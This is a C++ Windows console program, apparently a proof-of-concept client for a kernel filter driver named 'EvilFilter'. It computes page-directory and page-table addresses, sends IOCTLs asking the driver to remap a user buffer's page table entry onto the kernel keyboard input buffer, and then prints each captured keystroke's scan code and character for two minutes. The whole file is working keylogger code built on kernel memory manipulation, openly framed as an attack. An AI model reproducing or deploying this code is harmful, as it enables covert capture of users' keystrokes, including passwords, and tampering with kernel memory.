// ConsoleApplication2.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <SharedHeader.h>

VOID WaitAMinute() {
	printf("Waiting a minute...");
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	WORD CurrentMinute = systemTime.wMinute;
	WORD ExitMinute;
	if (systemTime.wSecond > 30) {
		ExitMinute = systemTime.wMinute + 2;
	}
	else {
		ExitMinute = systemTime.wMinute + 1;
	}
	//while (FALSE) {
	while (CurrentMinute != ExitMinute) {
		GetSystemTime(&systemTime);
		CurrentMinute = systemTime.wMinute;
	}
	printf("done waiting\n");
}

int main(int argc, _TCHAR* argv[]) {
	#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"),
		GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, //0, // FILE_SHARE_READ | FILE_SHARE_WRITE
		NULL, // no SECURITY_ATTRIBUTES structure
		OPEN_EXISTING, // No special create flags
		0, //  No special attributes
		NULL); // No template file

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");

		PBYTE r = (PBYTE)VirtualAlloc(NULL, sizeof(PBYTE), MEM_COMMIT | MEM_RESERVE, PAGE_READONLY); // PAGE_READONLY);
		*r = 15;
		printf("R is [0x%lx][0x%d]\n", r, *r);
		PULONG x = (PULONG)&r[0];
		printf("X0 is [0x%lx][0x%lu]\n", x, *x);
		x = (PULONG)&r[1];
		printf("X1 is [0x%lx][0x%lu]\n", x, *x);
		x = (PULONG)&r[2];
		printf("X2 is [0x%lx][0x%lu]\n", x, *x);
		x = (PULONG)&r[3];
		printf("X3 is [0x%lx][0x%lu]\n", x, *x);
		x = (PULONG)&r[4];
		printf("X4 is [0x%lx][0x%lu]\n", x, *x);
		x = (PULONG)&r[5];
		printf("X5 is [0x%lx][0x%lu]\n", x, *x);
		x = (PULONG)&r[6];
		printf("X6 is [0x%lx][0x%lu]\n", x, *x);
		x = (PULONG)&r[10];
		printf("X10 is [0x%lx][0x%lu]\n", x, *x);
		*x = 15;
		printf("X10 is [0x%lx][0x%lu]\n", x, *x);
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		OVERLAPPED      DeviceIoOverlapped;
		PSHARED_MEMORY_STRUCT dataToTransmit;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);

		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		DeviceIoOverlapped.Offset = 0;
		DeviceIoOverlapped.OffsetHigh = 0;
		DeviceIoOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);


		if (!DeviceIoControl(hControlDevice,
			IOCTL_CUSTOM_CODE,
			NULL, 0,
			dataToTransmit, SharedMemoryLength,
			&bytes, &DeviceIoOverlapped)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset = dataToTransmit->offset;
			ULONG keyboardOffset = (ULONG)keyboardData & 0x0fff;
			printf("Ioctl to EvilFilter device succeeded...offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);


			//keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));


			//keyboardData = (PKEYBOARD_INPUT_DATA)&rawAddress[kmdfOffset];


			keyboardOffset = (ULONG)keyboardData & 0x0fff;

			printf("keyboardData is [0x%lx] offset is [0x%lx].\n", keyboardData, keyboardOffset);
			/**/
			PLLIST listNode;
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				keyboardOffset = (ULONG)keyboardData & 0x0fff;
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}

			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}
			PVOID ppde = GetPdeAddress(keyboardData);
			PVOID ppte = GetPteAddress(keyboardData);
			/**/

			//PVOID ppde = GetPdeAddress(rawAddress);
			//PVOID ppte = GetPteAddress(rawAddress);
			printf("Page Directory is [0x%lx] Page Table is [0x%lx]\n", ppde, ppte);
			//PKEYBOARD_INPUT_DATA rawAddress = (PKEYBOARD_INPUT_DATA)VirtualAlloc(keyboardData, sizeof(KEYBOARD_INPUT_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READONLY);

			dataToTransmit->ClientMemory = keyboardData;
			//dataToTransmit->ClientMemory = rawAddress;
			dataToTransmit->PageDirectory = ppde;
			dataToTransmit->PageTable = ppte;
			dataToTransmit->instruction = 'E';

			if (!DeviceIoControl(hControlDevice,
				IOCTL_CUSTOM_CODE,
				NULL, 0,
				dataToTransmit, SharedMemoryLength,
				&bytes, &DeviceIoOverlapped)) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				printf("Ioctl to EvilFilter device succeeded \n");
				//keyboardData = (PKEYBOARD_INPUT_DATA)&rawAddress[kmdfOffset];
				printf("keyboardData=[0x%lx]\n", keyboardData);
				printf(" we now have the real keyboard buffer!!!\n");
				//printf("keyboardData=[0x%lx]\n", *keyboardData);
				USHORT lastFlag = 0;


				SYSTEMTIME systemTime;
				GetSystemTime(&systemTime);
				WORD CurrentMinute = systemTime.wMinute;
				WORD ExitMinute = systemTime.wMinute + 2;
				while (CurrentMinute != ExitMinute) {
					/*
					
	USHORT UnitId;
	USHORT MakeCode;
	USHORT Flags;
	USHORT Reserved;
	ULONG ExtraInformation;
					*/
					if (lastFlag != keyboardData->Flags ) { // keyboardData->MakeCode != 0
						printf(" %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]",
							keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
							keyboardData->MakeCode,
							KeyMap[keyboardData->MakeCode],
							keyboardData->UnitId,
							keyboardData->Flags,
							keyboardData->Reserved,
							keyboardData->ExtraInformation);
						printf(" raw:");
						PCHAR p = (PCHAR)keyboardData;
						for (int i = 0; i < 12; i++) {
							printf("[0x%x]", p[i]);

						}
						printf("\n");




						lastFlag = keyboardData->Flags;
					}
					GetSystemTime(&systemTime);
					CurrentMinute = systemTime.wMinute;
				}
			}
		}
		CloseHandle(hControlDevice);
		WaitAMinute();
		printf("almost done\n");
		WaitAMinute();
		// Everything dies right here, right as we exit
	}
	printf("fin\n");
	return 0;
}


PVOID GetPdeAddress(PVOID virtualaddr) {
	//ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 21;
	ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 22;
	printf("\n\nVirtualAddress [0x%lx] pageDirectoryIndex is [0x%lx]\n", virtualaddr, pageDirectoryIndex);
	PVOID pageDirectory = (PVOID)(PROCESS_PAGE_DIRECTORY_BASE + (pageDirectoryIndex * PTE_SIZE));
	printf("pageDirectoryTable   [0x%lx] ", pageDirectory);
	if ((pageDirectory)) {
		return pageDirectory;
	}
	else {
		printf(" is INVALID\n");
		return NULL;
	}
}

PVOID GetPteAddress(PVOID virtualaddr) {
	//ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 21;
	//ULONG pageTableIndex = (ULONG)virtualaddr >> 12 & 0x01FF;
	ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 22;
	ULONG pageTableIndex = (ULONG)virtualaddr >> 12 & 0x03FF;
	PVOID pageTable = (PVOID)(PROCESS_PAGE_TABLE_BASE + (pageTableIndex * PTE_SIZE) + (PAGE_SIZE * pageDirectoryIndex));
	printf("pageTable   [0x%lx] \n", pageTable);
	if ((pageTable)) {
		return pageTable;
	}
	else {
		printf(" is INVALID\n");
		return NULL;
	}
}

